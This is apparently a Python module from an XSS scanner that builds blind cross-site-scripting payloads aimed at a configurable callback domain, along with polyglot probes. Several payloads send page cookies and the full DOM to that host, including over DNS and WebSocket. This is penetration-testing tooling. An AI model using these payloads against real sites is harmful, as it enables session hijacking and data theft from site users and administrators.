"""
Blind XSS Detection Engine
Detects XSS that executes in different contexts (admin panels, logs, emails, etc.)
"""
from colorama import Fore, Style
import time
import hashlib
from urllib.parse import quote

class BlindXSSDetector:
    """Detect blind XSS vulnerabilities using callback mechanisms"""
    
    def __init__(self, config):
        self.config = config
        self.callback_domain = config.callback_domain if hasattr(config, 'callback_domain') else None
        self.payloads_sent = {}
        
    def generate_blind_payloads(self, identifier):
        """Generate blind XSS payloads with callback mechanisms"""
        
        if not self.callback_domain:
            # Use generic payloads without callbacks
            return self._get_generic_blind_payloads(identifier)
        
        callback_url = f"https://{self.callback_domain}/{identifier}"
        
        payloads = [
            # Image-based callbacks
            f'<img src="{callback_url}">',
            f'<img src=x onerror="this.src=\'{callback_url}\'">',
            
            # Script-based callbacks
            f'<script>fetch(\'{callback_url}\')</script>',
            f'<script>new Image().src=\'{callback_url}\'</script>',
            f'<script>document.location=\'{callback_url}\'</script>',
            
            # XMLHttpRequest callbacks
            f'<script>var xhr=new XMLHttpRequest();xhr.open(\'GET\',\'{callback_url}\');xhr.send()</script>',
            
            # WebSocket callbacks
            f'<script>new WebSocket(\'ws://{self.callback_domain}/{identifier}\')</script>',
            
            # DNS exfiltration
            f'<script>new Image().src=\'//\'+document.domain+\'.{identifier}.{self.callback_domain}\'</script>',
            
            # Cookie exfiltration
            f'<script>fetch(\'{callback_url}?c=\'+btoa(document.cookie))</script>',
            f'<script>new Image().src=\'{callback_url}?c=\'+document.cookie</script>',
            
            # DOM exfiltration
            f'<script>fetch(\'{callback_url}?d=\'+btoa(document.documentElement.innerHTML))</script>',
            
            # Multi-context payloads
            f'\"><img src={callback_url}>',
            f'\'><img src={callback_url}>',
            f'</script><script>fetch(\'{callback_url}\')</script>',
            f'</textarea><script>fetch(\'{callback_url}\')</script>',
            f'</select><img src={callback_url}>',
            
            # Event handler callbacks
            f'<svg onload="fetch(\'{callback_url}\')">',
            f'<body onload="fetch(\'{callback_url}\')">',
            f'<input onfocus="fetch(\'{callback_url}\')" autofocus>',
            
            # AngularJS callbacks
            f'{{{{constructor.constructor(\'fetch("{callback_url}")\')()}}}}',
            
            # Polyglot callbacks
            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch(\'{callback_url}\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch(\'{callback_url}\')//\\x3e',
        ]
        
        return payloads
    
    def _get_generic_blind_payloads(self, identifier):
        """Get generic blind XSS payloads without callbacks"""
        return [
            # Time-based detection
            '<script>setTimeout(function(){},5000)</script>',
            
            # Storage-based
            f'<script>localStorage.setItem("xss_{identifier}","1")</script>',
            f'<script>sessionStorage.setItem("xss_{identifier}","1")</script>',
            
            # Console-based
            f'<script>console.log("XSS_{identifier}")</script>',
            
            # Alert-based (for admin panels)
            f'<script>alert("XSS_{identifier}")</script>',
            f'<img src=x onerror="alert(\'XSS_{identifier}\')">',
            
            # Multi-context
            f'\"><script>alert("XSS_{identifier}")</script>',
            f'\'><script>alert("XSS_{identifier}")</script>',
            f'</script><script>alert("XSS_{identifier}")</script>',
        ]
    
    def test_blind_xss(self, url, param_name, form_data=None):
        """Test for blind XSS vulnerabilities"""
        # Generate unique identifier for this test
        identifier = hashlib.md5(f"{url}{param_name}{time.time()}".encode()).hexdigest()[:12]
        
        payloads = self.generate_blind_payloads(identifier)
        
        if self.config.verbose:
            print(f"{Fore.CYAN}[*] Testing blind XSS on parameter '{param_name}'{Style.RESET_ALL}")
            if self.callback_domain:
                print(f"{Fore.CYAN}[*] Using callback domain: {self.callback_domain}{Style.RESET_ALL}")
        
        # Store payload info for later verification
        self.payloads_sent[identifier] = {
            'url': url,
            'parameter': param_name,
            'timestamp': time.time(),
            'payloads': payloads
        }
        
        return {
            'identifier': identifier,
            'payloads': payloads,
            'callback_domain': self.callback_domain
        }
    
    def check_callbacks(self, identifier):
        """Check if any callbacks were received for a specific identifier"""
        # This would integrate with a callback server
        # For now, return placeholder
        return {
            'received': False,
            'callbacks': []
        }
    
    def generate_polyglot_payloads(self):
        """Generate polyglot XSS payloads that work in multiple contexts"""
        return [
            # Rsnake's polyglot
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e',
            
            # Gareth Heyes polyglot
            '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src="http://i.imgur.com/P8mL8.jpg">',
            
            # Multiple context polyglot
            '\'"--></style></script></title></textarea></noscript></noembed></template></frameset><svg onload=alert(1)>',
            
            # HTML + JavaScript polyglot
            '"><svg/onload=alert(1)>',
            '\'-alert(1)-\'',
            '\";alert(1);//',
            
            # Attribute + HTML polyglot
            '" autofocus onfocus=alert(1) x="',
            '\' autofocus onfocus=alert(1) x=\'',
            
            # URL + JavaScript polyglot
            'javascript:alert(1)//\';alert(1);//";alert(1);//\\";alert(1);//-->',
        ]
